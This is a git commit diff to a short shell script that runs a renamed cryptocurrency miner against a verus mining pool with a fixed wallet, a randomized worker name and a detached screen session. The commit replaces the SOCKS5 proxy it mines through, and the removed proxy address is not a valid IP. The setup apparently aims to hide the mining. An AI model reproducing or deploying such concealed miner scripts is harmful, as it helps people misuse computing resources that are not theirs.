4bd310859b31c412501331e65f63b3dc677eb11b
aacsvds <88640302+aacsvds@users.noreply.github.com>
2021-08-17 20:32:46 +0700

    Update jured.sh

--- jured.sh
+++ jured.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
 WORKER=$(echo $(shuf -i 1-10 -n 1)SHARK-01)
-PROXY=socks5://772.206.181.105:64935	
+PROXY=socks5://72.195.34.58:4145	
 ./hejo -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
